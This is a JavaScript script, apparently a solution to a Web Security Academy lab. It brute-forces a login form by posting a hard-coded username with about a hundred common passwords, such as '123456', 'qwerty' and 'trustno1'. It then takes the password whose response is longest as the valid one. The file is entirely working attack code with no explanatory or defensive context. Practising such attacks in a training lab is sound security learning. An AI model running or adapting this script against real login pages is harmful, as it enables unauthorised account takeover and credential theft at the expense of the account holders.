const passwords = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow",
]

const correctUsername = "info"

let formData = new FormData()
formData.set("username", correctUsername)

const url = "https://acf61fee1f57b7ff80209da7002c0040.web-security-academy.net/login"

let resLength = []

for(let i = 0; i < passwords.length; i++) {
    const password = passwords[i]
    formData.set("password", password)
    resLength.push(
        fetch(url, {
            method: 'POST',
            body: formData
        })
        .then(res => res.text())
        .then(res => res.length)          
    )
}

resLength = await Promise.all(resLength)

function filterUnique(value, index, self) {
  return self.indexOf(value) === index;
}

uniqueLens = resLength.filter(filterUnique)
maxLen = Math.max(...uniqueLens)

console.log("Correct password: " + passwords[resLength.indexOf(maxLen)])